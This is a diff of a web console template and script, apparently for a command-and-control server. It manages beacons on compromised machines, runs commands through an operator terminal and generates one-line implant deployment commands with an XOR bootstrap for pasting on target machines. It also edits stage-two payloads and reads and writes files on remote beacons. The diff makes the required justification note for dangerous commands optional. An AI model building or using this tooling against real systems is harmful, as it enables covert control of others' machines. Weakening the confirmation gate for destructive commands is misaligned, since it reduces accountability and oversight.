@@ -29,7 +29,6 @@
         <span style="flex:1;"></span>
         <button id="c2-toggle-btn" class="btn btn-sm btn-primary" onclick="toggleC2()" title="启动/停止 C2 server">启动</button>
         <button id="c2-deploy-btn" class="btn btn-sm" onclick="openDeployModal()" title="生成 implant 部署命令">部署向导</button>
-        <button id="c2-listener-btn" class="btn btn-sm" onclick="openListenerModal()" title="配置 server/client 等通道端口">通道配置</button>
         <button id="c2-audit-btn" class="btn btn-sm" onclick="openAuditModal()" title="C2 操作审计日志">操作日志</button>
         <button id="c2-export-btn" class="btn btn-sm" onclick="downloadExportConfig()" title="导出独立 server 部署包(代码+配置+说明),在另一台服务器解压即可启动">导出配置</button>
         <button id="c2-stage2-btn" class="btn btn-sm" onclick="editStage2()" title="查看/编辑二阶段载荷源码(明文),新 beacon 首次回连时下发执行">二阶段载荷</button>
@@ -152,8 +151,6 @@
                 <nav class="tabs tabs-sm">
                     <a class="tab active" data-mtab="implant" onclick="return switchMtab('implant')" href="#">植入模块</a>
                     <a class="tab" data-mtab="server" onclick="return switchMtab('server')" href="#">Server 模块</a>
-                    <a class="tab" data-mtab="manage" onclick="return switchMtab('manage')" href="#">模块管理</a>
-                    <a class="tab" data-mtab="history" onclick="return switchMtab('history')" href="#">历史命令</a>
                 </nav>
 
                 {# 植入模块 #}
@@ -168,28 +165,14 @@
                     <p class="help-text">server 端模块（keygen/build/agent_dns 等），点击查看详情并可用 s_exec 运行。</p>
                     <div id="smodule-list" class="mod-list"></div>
                 </div>
-
-                {# 模块管理 #}
-                <div id="mtab-manage" style="display:none;">
-                    <h3 style="font-size:0.85rem;">添加模块</h3>
-                    <input type="text" id="mm-add-filename" class="form-control" placeholder="文件名，如 mymod.py / myseq.json" aria-label="模块文件名"
-                           style="font-family:var(--font-mono);font-size:0.8rem;">
-                    <textarea id="mm-add-content" class="editor-textarea" rows="7" spellcheck="false" aria-label="模块代码"
-                        placeholder="模块代码（.py 含 MODULE 元数据 / .json steps 序列）" style="font-size:0.76rem;"></textarea>
-                    <div class="form-row" style="margin-top:8px;">
-                        <button class="btn btn-sm btn-primary" onclick="addModuleFile()">添加并热加载</button>
-                        <span class="help-text" id="mm-add-status" style="margin:0;font-family:var(--font-mono);"></span>
-                    </div>
-                    <hr>
-                    <h3 style="font-size:0.85rem;">已安装模块文件</h3>
-                    <div id="module-manage-list" class="mod-list"></div>
+            </div>
+            <div class="card panel-history">
+                <div class="card-title">
+                    <h3 style="margin:0;">历史命令</h3>
+                    <button class="btn btn-sm" onclick="clearHistory()" title="清空本地历史命令记录">清空</button>
                 </div>
-
-                {# 历史命令 #}
-                <div id="mtab-history" style="display:none;">
-                    <p class="help-text">终端执行过的命令(最多 200 条, 存于 localStorage)。</p>
-                    <div id="history-list" class="mod-list" style="font-family:var(--font-mono);font-size:0.72rem;line-height:1.6;"></div>
-                </div>
+                <p class="help-text" style="margin:8px 0;">终端执行过的命令(最多 20000 条, 存于 localStorage)。</p>
+                <div id="history-list" class="auto-list" style="font-family:var(--font-mono);font-size:0.72rem;line-height:1.6;"></div>
             </div>
         </div>
     </div>
@@ -200,13 +183,15 @@
     <div class="modal modal-lg">
         <h3 id="mm-title">模块详情</h3>
         <div id="mm-desc" class="help-text" style="margin-bottom:10px;"></div>
-        <div id="mm-params" style="margin-bottom:10px;"></div>
         <div id="mm-code-wrap" style="display:none;margin-bottom:10px;">
-            <details>
-                <summary>模块源码</summary>
-                <pre class="code-block" id="mm-code" style="max-height:220px;font-size:0.72rem;"></pre>
-            </details>
+            <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px;cursor:pointer;user-select:none;" onclick="toggleMmCode()" title="点击展开/收起模块源码">
+                <h3 style="margin:0;font-size:0.85rem;flex:1;">模块源码 <span id="mm-code-ind" style="font-weight:normal;color:var(--text-dim);font-size:0.72rem;">▸ 点击展开</span></h3>
+                <button class="btn btn-sm btn-primary" id="mm-save-btn" onclick="event.stopPropagation();saveModuleSource()" style="display:none;">保存源码</button>
+            </div>
+            <textarea id="mm-code" rows="12" spellcheck="false" aria-label="模块源码"
+                class="editor-textarea" style="display:none;font-size:0.74rem;"></textarea>
         </div>
+        <div id="mm-params" style="margin-bottom:10px;"></div>
         <div id="mm-test-area">
             <div class="form-row" style="align-items:flex-end;">
                 <div class="form-group" style="margin:0;flex:1;">
@@ -295,8 +280,8 @@
 </div>
 
 {# ── 部署向导 ── #}
-<div id="deploy-modal" class="modal-backdrop" style="display:none;">
-    <div class="modal" style="width:min(760px,92vw);">
+<div id="deploy-modal" class="modal-backdrop" style="display:none;position:fixed;top:0;right:0;bottom:0;left:0;z-index:1000;background:rgba(0,0,0,0.65);align-items:center;justify-content:center;">
+    <div class="modal" style="width:min(760px,92vw);background:var(--surface);border:1px solid var(--border-bright);border-radius:14px;padding:26px;box-shadow:0 0 60px rgba(34,211,238,0.12),0 24px 60px rgba(0,0,0,0.5);">
         <h3>部署向导 · 生成 implant</h3>
         <p class="help-text">生成基础 implant 的单行部署命令(含 XOR bootstrap,可直接粘贴到目标机执行)。生成后 beacon 按 interval/jitter 回连。</p>
         <div class="form-row" style="gap:10px;margin:12px 0;flex-wrap:wrap;">
@@ -316,7 +301,15 @@
                 <label for="dp-jitter">抖动</label>
                 <input type="number" id="dp-jitter" class="form-control" style="width:80px;font-family:var(--font-mono);" value="0.2" step="0.05">
             </div>
+            <div class="form-group" style="margin:0;">
+                <label for="dp-mode">载荷模式</label>
+                <select id="dp-mode" class="form-control" style="width:150px;font-family:var(--font-mono);font-size:0.8rem;" title="分段: 第一段引导连服务端后由二阶段(stage_code)下发完整植入物; 单段: 一条命令内嵌完整植入物, 不依赖二阶段">
+                    <option value="staged">分段(引导+二阶段)</option>
+                    <option value="single">单段(完整植入物)</option>
+                </select>
+            </div>
         </div>
+        <p class="help-text" id="dp-mode-note" style="margin:-4px 0 10px;">分段: 第一段引导回连后,服务端自动下发二阶段(stage_code)exec 出完整植入物——需服务端已用 build/二阶段载荷 设置过第二段;单段: 命令自带完整植入物,不依赖二阶段,体积更大。</p>
         <div class="form-row" style="gap:8px;margin-bottom:10px;">
             <button class="btn btn-primary" onclick="doBuildDeploy()">生成部署命令</button>
             <button class="btn btn-sm" onclick="dpCopy()">复制命令</button>
@@ -331,8 +324,8 @@
 </div>
 
 {# ── 操作日志 ── #}
-<div id="audit-modal" class="modal-backdrop" style="display:none;">
-    <div class="modal modal-lg" style="width:min(860px,94vw);">
+<div id="audit-modal" class="modal-backdrop" style="display:none;position:fixed;top:0;right:0;bottom:0;left:0;z-index:1000;background:rgba(0,0,0,0.65);align-items:center;justify-content:center;">
+    <div class="modal" style="width:min(860px,94vw);background:var(--surface);border:1px solid var(--border-bright);border-radius:14px;padding:26px;box-shadow:0 0 60px rgba(34,211,238,0.12),0 24px 60px rgba(0,0,0,0.5);">
         <h3>C2 操作日志</h3>
         <div class="form-row" style="gap:8px;margin:8px 0;">
             <input type="text" id="audit-search" class="form-control" placeholder="过滤(命令/beacon/时间)" style="flex:1;font-size:0.75rem;font-family:var(--font-mono);" oninput="renderAudit()" aria-label="过滤审计日志">
@@ -342,38 +335,6 @@
         <pre class="code-block" id="audit-list" style="max-height:60vh;overflow:auto;font-size:0.72rem;"></pre>
         <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px;">
             <button class="btn btn-secondary" onclick="closeAuditModal()">关闭</button>
-        </div>
-    </div>
-</div>
-
-{# ── 通道配置 ── #}
-<div id="listener-modal" class="modal-backdrop" style="display:none;">
-    <div class="modal modal-lg" style="width:min(820px,94vw);">
-        <h3>通道配置(写回 config.json,重启生效)</h3>
-        <p class="help-text">端口填 0 = 关闭该通道。server/client 端口与密钥变更需重启 C2。</p>
-        <div class="form-row" style="gap:12px;margin:12px 0;flex-wrap:wrap;">
-            <div class="form-group" style="margin:0;">
-                <label for="lc-server_port">server 端口</label>
-                <input type="number" id="lc-server_port" class="form-control" style="width:90px;font-family:var(--font-mono);">
-            </div>
-            <div class="form-group" style="margin:0;">
-                <label for="lc-client_port">client 端口</label>
-                <input type="number" id="lc-client_port" class="form-control" style="width:90px;font-family:var(--font-mono);">
-            </div>
-        </div>
-        <div class="form-row" style="gap:12px;margin:12px 0;flex-wrap:wrap;">
-            <div class="form-group" style="margin:0;">
-                <label for="lc-client_timeout">client 超时(s)</label>
-                <input type="number" id="lc-client_timeout" class="form-control" style="width:90px;font-family:var(--font-mono);">
-            </div>
-        </div>
-        <div class="form-row" style="gap:8px;margin-bottom:10px;">
-            <button class="btn btn-primary" onclick="saveListenerConfig()">保存配置</button>
-            <button class="btn btn-sm btn-danger" onclick="restartC2()">重启 C2</button>
-            <span class="help-text" id="lc-status" style="margin:0;font-family:var(--font-mono);"></span>
-        </div>
-        <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px;">
-            <button class="btn btn-secondary" onclick="closeListenerModal()">关闭</button>
         </div>
     </div>
 </div>
@@ -800,7 +761,7 @@ function fs3DialogOpen(opts) {
         var inputHtml = '<textarea id="fs3-dialog-input" rows="' + rows +
             '" style="width:100%;box-sizing:border-box;font-family:var(--font-mono);font-size:0.78rem;resize:vertical;background:rgba(3,7,15,0.6);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:8px;margin-top:8px;"' +
             (opts.placeholder ? ' placeholder="' + escapeHtml(opts.placeholder) + '"' : '') + '></textarea>';
-        var hint = isNote ? '<div id="fs3-dialog-note-hint" style="display:none;color:var(--danger);font-size:0.72rem;margin-top:6px;">请填写执行备注后确认(Ctrl+Enter)</div>' : '';
+        var hint = isNote ? '<div id="fs3-dialog-note-hint" style="display:none;color:var(--text-dim);font-size:0.72rem;margin-top:6px;">执行备注可选, 填了会展示在执行记录中</div>' : '';
         body.innerHTML = '<div style="white-space:pre-wrap;">' + escapeHtml(msg) + '</div>' + inputHtml + hint;
         if (isNote) {
             document.getElementById('fs3-dialog-cancel').style.display = '';
@@ -841,14 +802,7 @@ function fs3DialogClose(val) {
 function fs3DialogOk() {
     if (!_fs3Dialog) return;
     if (_fs3InputEl) {
-        // note 模式: 备注必填, 为空不关闭并提示
-        if (_fs3Dialog.requireNote && !_fs3InputEl.value.trim()) {
-            const hint = document.getElementById('fs3-dialog-note-hint');
-            if (hint) hint.style.display = 'block';
-            _fs3InputEl.style.borderColor = 'var(--danger)';
-            _fs3InputEl.focus();
-            return;
-        }
+        // note 模式: 备注可选(2026-09-05 起不强制必填), 空备注直接确认执行
         fs3DialogClose(_fs3InputEl.value);
     } else {
         fs3DialogClose(true);
@@ -873,13 +827,14 @@ function fs3Confirm(message, title) {
     });
 }
 
-// 危险命令确认(带必填备注, Ctrl+Enter 确认):返回 Promise<备注|null>
+// 危险命令确认(备注可选, Ctrl+Enter 确认):返回 Promise<备注|null>
+// 填的备注经 termCmd 回显进执行记录; 空备注=直接确认执行
 function fs3NoteConfirm(message, title) {
     return new Promise(function (resolve) {
         fs3DialogOpen({
             title: title || '危险命令确认', message: message, mode: 'note',
-            okText: '确认执行 (Ctrl+Enter)', placeholder: '填写执行备注(必填)...',
-            requireNote: true, resolve: resolve
+            okText: '确认执行 (Ctrl+Enter)', placeholder: '执行备注(可选, 留空直接执行)...',
+            requireNote: false, resolve: resolve
         });
     });
 }
@@ -975,6 +930,13 @@ c2out.addEventListener('scroll', function() {
 function termAppend(text, cls) {
     const lines = String(text == null ? '' : text).split('\n');
     for (const line of lines) {
+        if (line === '') {
+            // 纯空行分隔(无时间戳): \n 前导/结果块间隔的视觉空隙
+            const g = document.createElement('div');
+            g.className = 'term-gap';
+            c2out.appendChild(g);
+            continue;
+        }
         if (!termLineVisible(line)) continue;  // 新行过滤不通过 → 不入 DOM 不显示
         const div = document.createElement('div');
         const kls = cls || (line.startsWith('[!]') ? 'terr' : line.startsWith('[+]') ? 'tok'
@@ -1061,22 +1023,27 @@ function alignTermCaret() {
     const br = bar.getBoundingClientRect();
     const ir = c2cmd.getBoundingClientRect();
     c2CaretEl.style.left = Math.round(ir.left - br.left) + 'px';
+    // top: textarea 第一行文字行中心(盒内文字顶部对齐, 行高 lh 从盒顶起)
+    // caret(高≈font 0.85rem) 顶 = 盒顶 + lh/2 - caret半高 → 与文字行垂直居中
+    const lh = parseFloat(getComputedStyle(c2cmd).lineHeight) || 20;
+    c2CaretEl.style.top = Math.round((ir.top - br.top) + lh / 2 - 6.5) + 'px';
 }
 alignTermCaret();
 window.addEventListener('resize', alignTermCaret);
 
 function pushHistory(line) {
     termHist.push(line);
-    if (termHist.length > 200) termHist = termHist.slice(-200);
+    if (termHist.length > 20000) termHist = termHist.slice(-20000);
     localStorage.setItem('fs3_c2_history', JSON.stringify(termHist));
     histIdx = termHist.length;
-    // 历史命令面板可见时实时刷新
-    if (currentMtab === 'history') renderHistory();
+    // 历史命令常驻右栏独立栏目——总是刷新
+    renderHistory();
 }
 
 function renderHistory() {
     const box = document.getElementById('history-list');
     if (!box) return;
+    syncHistHeight();   // 历史命令栏高度跟随自动执行列表实际高度
     if (!termHist.length) { box.innerHTML = '<span class="empty">暂无历史命令</span>'; return; }
     box.innerHTML = termHist.map(function(line) {
         return '<div style="white-space:pre-wrap;word-break:break-all;border-bottom:1px dashed var(--border);padding:3px 2px;">' +
@@ -1084,6 +1051,29 @@ function renderHistory() {
     }).join('');
     box.scrollTop = box.scrollHeight;  // 滚到底(最新在末尾)
 }
+
+// 左右对称: 历史命令栏目与自动执行栏目整体等高
+// 量 panel-auto 卡片实际高度 → panel-history 卡片设同高(内部列表 flex 填充)
+function syncHistHeight() {
+    const autoCard = document.querySelector('.wb-left .panel-auto');
+    const histCard = document.querySelector('.wb-right .panel-history');
+    if (!autoCard || !histCard) return;
+    const h = autoCard.offsetHeight;
+    if (h > 0 && Math.abs(h - histCard.offsetHeight) > 2) {
+        histCard.style.height = h + 'px';
+    }
+}
+
+function clearHistory() {
+    if (!termHist.length) return;
+    termHist = [];
+    histIdx = 0;
+    localStorage.setItem('fs3_c2_history', '[]');
+    renderHistory();
+}
+
+// 历史命令常驻左栏栏目——页面加载即渲染
+renderHistory();
 
 // ── Tab 补全 ──
 let compState = null;
@@ -1210,9 +1200,17 @@ document.addEventListener('click', function(e) { if (!compBox.contains(e.target)
 async function termCmd(line, opts) {
     opts = opts || {};
     const trimmed = (line || '').trim();
+    let note = '';
     if (!opts.bypass && trimmed && isDangerCmd(trimmed)) {
-        const okc = await fs3NoteConfirm('检测到危险命令:\n' + trimmed + '\n\n请填写执行备注(必填):');
-        if (!okc) return false;
+        const okc = await fs3NoteConfirm('检测到危险命令:\n' + trimmed + '\n\n执行备注(可选):');
+        if (okc === null) return false;   // 仅取消拒绝; 空备注=确认执行
+        note = okc.trim();
+    } else if (opts.note) {
+        note = opts.note.trim();   // 整批已确认过: 备注随行透传
+    }
+    if (note) {
+        // 填的备注回显进执行记录(终端输出, 可复制)
+        termAppend('⏺ 执行备注: ' + note, 'tnote');
     }
     termAppend('pyexec> ' + line, 'techo');
     // 终端 use <bid> 选中:同步前端 currentBid + 启动结果轮询(与点击 beacon 卡片等价)
@@ -1247,11 +1245,15 @@ async function execCmd() {
     // 危险命令二次确认:整批一次确认(kill/exit/persist/set_key/raw/uplevel/
     // 破坏性 exec 等),确认后逐行 bypass(termCmd 闸门不再重复弹)
     const danger = lines.filter(isDangerCmd);
-    if (danger.length && !(await fs3NoteConfirm('检测到危险命令:\n' + danger.join('\n') + '\n\n请填写执行备注(必填):'))) return;
+    let batchNote = '';
+    if (danger.length) {
+        batchNote = await fs3NoteConfirm('检测到危险命令:\n' + danger.join('\n') + '\n\n执行备注(可选):');
+        if (batchNote === null) return;   // 取消=整批不执行
+    }
     lines.forEach(l => pushHistory(l));
     c2cmd.value = '';
     (async function() {
-        for (const l of lines) await termCmd(l, {bypass: true});
+        for (const l of lines) await termCmd(l, {bypass: true, note: batchNote});
     })();
 }
 
@@ -1288,7 +1290,6 @@ async function loadStatus() {
     loadModules();
     loadCommands();
     loadAutoCommands();
-    loadModuleFiles();
 }
 
 // 启动/停止 toggle 按钮:运行中=「停止」(danger),已停止=「启动」(primary)
@@ -1418,12 +1419,129 @@ async function editStage2() {
     }
 }
 
+// ══════════ 文件编辑弹窗(fs3-modal-backdrop 内联模式) ══════════
+let fePollTimer = null;
+
+function openFileEditModal() {
+    const m = document.getElementById('file-edit-modal');
+    if (!m) return;
+    const sel = document.getElementById('fe-beacon');
+    if (sel) {
+        const prev = sel.value;
+        sel.innerHTML = '';
+        if (!beaconIds.length) {
+            sel.innerHTML = '<option value="">(无 beacon)</option>';
+        } else {
+            beaconIds.forEach(function(b) {
+                const o = document.createElement('option');
+                o.value = b;
+                o.textContent = b.slice(0, 8) + '…';
+                sel.appendChild(o);
+            });
+            if (prev && beaconIds.indexOf(prev) !== -1) sel.value = prev;
+        }
+    }
+    const p = document.getElementById('fe-path');
+    if (p) p.value = '';
+    const c = document.getElementById('fe-content');
+    if (c) c.value = '';
+    const st = document.getElementById('fe-status');
+    if (st) st.textContent = '';
+    m.style.setProperty('display', 'flex', 'important');
+}
+
+function closeFileEditModal() {
+    const m = document.getElementById('file-edit-modal');
+    if (m) m.style.setProperty('display', 'none', 'important');
+    if (fePollTimer) { clearInterval(fePollTimer); fePollTimer = null; }
+}
+
+async function fileEditRead() {
+    const bid = document.getElementById('fe-beacon').value;
+    const path = document.getElementById('fe-path').value.trim();
+    const st = document.getElementById('fe-status');
+    if (!bid || !path) { st.textContent = 'beacon 与路径必填'; st.style.color = 'var(--danger)'; return; }
+    st.textContent = '读取中...';
+    st.style.color = 'var(--text-muted)';
+    try {
+        const resp = await fetch('/api/c2/file-edit', {method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({action: 'read', beacon_id: bid, path: path})});
+        const data = await resp.json();
+        if (!data.ok || !data.task_id) {
+            st.textContent = '✗ ' + (data.message || data.error || '下发失败');
+            st.style.color = 'var(--danger)';
+            return;
+        }
+        if (fePollTimer) clearInterval(fePollTimer);
+        const t0 = Date.now();
+        fePollTimer = setInterval(async function() {
+            try {
+                const r2 = await fetch('/api/c2/beacon/' + encodeURIComponent(bid));
+                const d2 = await r2.json();
+                const list = (d2.beacon && d2.beacon.results) || [];
+                const hits = list.filter(function(x) { return x.task_id === data.task_id; });
+                const hit = hits[hits.length - 1];
+                if (!hit) {
+                    if (Date.now() - t0 > 30000) {
+                        clearInterval(fePollTimer); fePollTimer = null;
+                        st.textContent = '✗ 读取超时'; st.style.color = 'var(--danger)';
+                    }
+                    return;
+                }
+                clearInterval(fePollTimer); fePollTimer = null;
+                if (hit.error) {
+                    st.textContent = '✗ ' + String(hit.error).slice(0, 300);
+                    st.style.color = 'var(--danger)';
+                    return;
+                }
+                const out = hit.output || '';
+                document.getElementById('fe-content').value = out;
+                st.textContent = '✓ 已读取 ' + out.length + ' 字符';
+                st.style.color = 'var(--success)';
+            } catch (e) {
+                clearInterval(fePollTimer); fePollTimer = null;
+                st.textContent = '✗ ' + e.message;
+                st.style.color = 'var(--danger)';
+            }
+        }, 1500);
+    } catch (e) {
+        st.textContent = '✗ 请求失败: ' + e.message;
+        st.style.color = 'var(--danger)';
+    }
+}
+
+async function fileEditSave() {
+    const bid = document.getElementById('fe-beacon').value;
+    const path = document.getElementById('fe-path').value.trim();
+    const content = document.getElementById('fe-content').value;
+    const st = document.getElementById('fe-status');
+    if (!bid || !path) { st.textContent = 'beacon 与路径必填'; st.style.color = 'var(--danger)'; return; }
+    st.textContent = '保存中...';
+    st.style.color = 'var(--text-muted)';
+    try {
+        const resp = await fetch('/api/c2/file-edit', {method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({action: 'write', beacon_id: bid, path: path, content: content})});
+        const data = await resp.json();
+        if (!data.ok) {
+            st.textContent = '✗ ' + (data.message || data.error || '保存失败');
+            st.style.color = 'var(--danger)';
+            return;
+        }
+        st.textContent = '✓ ' + (data.message || '已保存');
+        st.style.color = 'var(--success)';
+        if (fePollTimer) { clearInterval(fePollTimer); fePollTimer = null; }
+    } catch (e) {
+        st.textContent = '✗ 请求失败: ' + e.message;
+        st.style.color = 'var(--danger)';
+    }
+}
+
 function openRemoteModal() {
-    document.getElementById('remote-modal').style.display = 'flex';
+    document.getElementById('remote-modal').style.setProperty('display', 'flex', 'important');
     loadRemoteStatus();
 }
 
-function closeRemoteModal() { document.getElementById('remote-modal').style.display = 'none'; }
+function closeRemoteModal() { document.getElementById('remote-modal').style.setProperty('display', 'none', 'important'); }
 
 async function loadRemoteStatus() {
     try {
@@ -1484,10 +1602,10 @@ function applyRemoteUI() {
         badge.style.display = on ? '' : 'none';
         document.getElementById('remote-badge-url').textContent = c2Remote.url;
     }
-    // 本地专属按钮远程模式下禁用(2026-09-04 B8 扩展): 通道配置/重启/审计/
+    // 本地专属按钮远程模式下禁用(2026-09-04 B8 扩展): 重启/审计/
     // 导出/二阶段/文件编辑/部署向导/启动停止均作用于本地 server——远程态
     // 仍可点会把操作落在本地,造成"以为在管远端"的误导
-    ['c2-toggle-btn', 'c2-deploy-btn', 'c2-listener-btn', 'c2-audit-btn',
+    ['c2-toggle-btn', 'c2-deploy-btn', 'c2-audit-btn',
      'c2-export-btn', 'c2-stage2-btn', 'c2-fe-btn'].forEach(function(id) {
         const el = document.getElementById(id);
         if (!el) return;
@@ -1837,6 +1955,14 @@ let shownResultKeys = {};
 let resultPollTimer = null;
 let remoteLastDetail = '';   // 远程模式: 上次详情文本(增量对比)
 
+// 结果内容指纹(djb2): 用于结果去重——同 task_id 内容相同跳过(2026-09-05)
+function resFp(s) {
+    let h = 5381;
+    s = String(s == null ? '' : s);
+    for (let i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) >>> 0;
+    return h.toString(36);
+}
+
 function trackBeaconResults() {
     if (!currentBid) return;
     if (isRemote()) {
@@ -1873,17 +1999,21 @@ function trackBeaconResults() {
             const results = d.beacon.results || [];
             for (let i = 0; i < results.length; i++) {
                 const res = results[i];
-                const key = res.task_id + '@' + (res.received_at || '');
+                // 去重键: task_id + 内容指纹——同任务结果每次回传 received_at
+                // 都更新(overwrite 型/重发), 若按 received_at 当 key 会每轮
+                // 轮询重复显示同一结果; 内容相同跳过, 内容变化(shell 输出
+                // 进展/多段结果)才显示(2026-09-05 修复)
+                const key = (res.task_id || '?') + '#' + resFp(res.output) + '.' + resFp(res.error);
                 if (shownResultKeys[key]) continue;
                 shownResultKeys[key] = true;
                 const out = res.output || '';
                 const err = res.error || '';
                 if (err) {
-                    termAppend('执行结果 [' + (res.task_id || '?') + ']:\n[error] ' + err, 'terr');
+                    termAppend('\n执行结果 [' + (res.task_id || '?') + ']:\n[error] ' + err, 'terr');
                 } else if (out) {
-                    termAppend('执行结果 [' + (res.task_id || '?') + ']:\n' + out, 'tok');
+                    termAppend('\n执行结果 [' + (res.task_id || '?') + ']:\n' + out, 'tok');
                 } else {
-                    termAppend('执行结果 [' + (res.task_id || '?') + ']:\n(无输出)', 'tplain');
+                    termAppend('\n执行结果 [' + (res.task_id || '?') + ']:\n(无输出)', 'tplain');
                 }
             }
         })
@@ -1917,7 +2047,7 @@ async function openBeaconDetail(bid) {
         fs3Alert('远程模式下请用终端: use ' + bid + ' 后查看详情/结果(详情自动回显)');
         return;
     }
-    document.getElementById('beacon-detail-modal').style.display = 'flex';
+    document.getElementById('beacon-detail-modal').style.setProperty('display', 'flex', 'important');
     document.getElementById('bd-title').textContent = 'Beacon ' + bid;
     document.getElementById('bd-remark').value = '';
     document.getElementById('bd-fpath').value = '/';
@@ -2014,7 +2144,7 @@ async function deleteBdTask(taskId) {
 }
 
 function closeBeaconDetail() {
-    document.getElementById('beacon-detail-modal').style.display = 'none';
+    document.getElementById('beacon-detail-modal').style.setProperty('display', 'none', 'important');
     bdBeacon = null;
 }
 
@@ -2061,27 +2191,28 @@ async function bdDownload() {
 let dpDeploy = '';
 
 function openDeployModal() {
-    document.getElementById('deploy-modal').style.display = 'flex';
+    document.getElementById('deploy-modal').style.setProperty('display', 'flex', 'important');
     document.getElementById('dp-status').textContent = '';
     document.getElementById('dp-output').style.display = 'none';
     document.getElementById('dp-note').style.display = 'none';
     dpDeploy = '';
 }
 
-function closeDeployModal() { document.getElementById('deploy-modal').style.display = 'none'; }
+function closeDeployModal() { document.getElementById('deploy-modal').style.setProperty('display', 'none', 'important'); }
 
 async function doBuildDeploy() {
     const host = document.getElementById('dp-host').value.trim();
     const port = parseInt(document.getElementById('dp-port').value, 10) || 0;
     const interval = parseInt(document.getElementById('dp-interval').value, 10) || 60;
     const jitter = parseFloat(document.getElementById('dp-jitter').value) || 0.2;
+    const single = document.getElementById('dp-mode').value === 'single';
     const statusEl = document.getElementById('dp-status');
     if (!host || port <= 0) { statusEl.textContent = 'host/port 必填'; statusEl.style.color = 'var(--danger)'; return; }
     statusEl.textContent = '生成中...';
     statusEl.style.color = 'var(--text-muted)';
     try {
         const resp = await fetch('/api/c2/build-deploy', {method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({host: host, port: port, interval: interval, jitter: jitter})});
+            body: JSON.stringify({host: host, port: port, interval: interval, jitter: jitter, single: single})});
         const data = await resp.json();
         if (!data.ok) { statusEl.textContent = '✗ ' + (data.error || '生成失败'); statusEl.style.color = 'var(--danger)'; return; }
         dpDeploy = data.deploy || '';
@@ -2090,8 +2221,12 @@ async function doBuildDeploy() {
         const noteEl = document.getElementById('dp-note');
         noteEl.style.display = 'block';
         noteEl.textContent = '回连 ' + host + ':' + port + ' · 间隔 ' + interval + 's ±' + jitter +
+            (data.mode ? ' · 模式 ' + data.mode : '') +
             (data.key_fp ? ' · implant_key ' + data.key_fp : '') +
             (data.file ? ' · 产物文件: ' + data.file : '') +
+            (single
+                ? '\n单段部署: 一条命令内嵌完整植入物, 不依赖服务端二阶段。'
+                : (data.note ? '\n' + data.note : '')) +
             '\n部署:Linux/macOS 粘贴到终端执行;Windows 建议存成 .py 后 python payload.py(直接 echo 管道在 cmd 下会丢引号)。';
         statusEl.textContent = '✓ 生成成功';
         statusEl.style.color = 'var(--success)';
@@ -2111,11 +2246,11 @@ function dpCopy() {
 let c2Audit = [];
 
 function openAuditModal() {
-    document.getElementById('audit-modal').style.display = 'flex';
+    document.getElementById('audit-modal').style.setProperty('display', 'flex', 'important');
     loadAudit();
 }
 
-function closeAuditModal() { document.getElementById('audit-modal').style.display = 'none'; }
+function closeAuditModal() { document.getElementById('audit-modal').style.setProperty('display', 'none', 'important'); }
 
 async function loadAudit() {
     try {
@@ -2147,166 +2282,6 @@ function exportC2Events() {
     showNotice('事件导出已开始' + (bid ? '(当前 beacon)' : '(全部)'), true);
 }
 
-// ══════════ 通道配置 ══════════
-function openListenerModal() {
-    document.getElementById('listener-modal').style.display = 'flex';
-    document.getElementById('lc-status').textContent = '';
-    const c = (c2StatusDetail && c2StatusDetail.config) || {};
-    function setv(id, v) { document.getElementById(id).value = v; }
-    setv('lc-server_port', c.server_port != null ? c.server_port : '');
-    setv('lc-client_port', c.client_port != null ? c.client_port : '');
-    setv('lc-client_timeout', c.client_timeout != null ? c.client_timeout : '');
-}
-
-function closeListenerModal() { document.getElementById('listener-modal').style.display = 'none'; }
-
-// ── 文件编辑弹窗(fs3-modal-backdrop 模式) ──
-function openFileEditModal() {
-    if (isRemote()) {
-        // 文件编辑走本地 /api/c2/file-edit + beacon detail,远程模式未接线——
-        // 禁用入口防"操作落在本地/报错"(2026-09-04 B8)
-        fs3Alert('远程模式下请使用终端: edit <bid> <path> 或 download 模块操作文件');
-        return;
-    }
-    const sel = document.getElementById('fe-beacon');
-    const prev = sel.value;
-    sel.innerHTML = '';
-    (allBeacons || []).forEach(function(b) {
-        const o = document.createElement('option');
-        o.value = b.client_id;
-        o.textContent = b.client_id.slice(0, 8) + ' · ' + (b.sys_platform || '?') + (b.sys_user ? ' · ' + b.sys_user : '');
-        sel.appendChild(o);
-    });
-    // 默认选当前选中的 beacon(与终端 use 一致); 无选中时才退回上次选择
-    const defId = (currentBid && Array.from(sel.options).some(
-        function(o) { return o.value === currentBid; })) ? currentBid : prev;
-    if (defId) sel.value = defId;
-    document.getElementById('fe-path').value = '';
-    document.getElementById('fe-content').value = '';
-    document.getElementById('fe-status').textContent = '';
-    document.getElementById('file-edit-modal').style.setProperty('display', 'flex', 'important');
-    setTimeout(function() { document.getElementById('fe-path').focus(); }, 50);
-}
-function closeFileEditModal() {
-    document.getElementById('file-edit-modal').style.setProperty('display', 'none', 'important');
-}
-async function fileEditRead() {
-    const bid = document.getElementById('fe-beacon').value;
-    const path = document.getElementById('fe-path').value.trim();
-    if (!bid || !path) { fs3Alert('请选择 Beacon 并填写文件路径'); return; }
-    const status = document.getElementById('fe-status');
-    status.textContent = '已下发读取，等待结果...';
-    try {
-        const resp = await fetch('/api/c2/file-edit', {method: 'POST', headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({action: 'read', beacon_id: bid, path: path})});
-        const data = await resp.json();
-        if (!data.ok) { status.textContent = '✗ ' + (data.message || data.error || ''); return; }
-        status.textContent = '任务已下发，轮询结果...';
-        pollFileEditRead(bid, data.task_id || '');
-    } catch (e) { status.textContent = '✗ 请求失败: ' + e.message; }
-}
-async function pollFileEditRead(bid, taskId) {
-    const status = document.getElementById('fe-status');
-    for (let i = 0; i < 50; i++) {
-        await new Promise(function(r) { setTimeout(r, 600); });
-        try {
-            const resp = await fetch('/api/c2/beacon/' + bid + '/detail');
-            const data = await resp.json();
-            if (!data.ok || !data.beacon) continue;
-            const results = data.beacon.results || [];
-            // 按 task_id 精确匹配本次读任务的结果(而非"取最后一条"):
-            // 并发任务先回/结果窗口滑动时,最后一条可能是别的命令输出,
-            // 会把无关内容当文件内容填进编辑框
-            let hit = null;
-            if (taskId) {
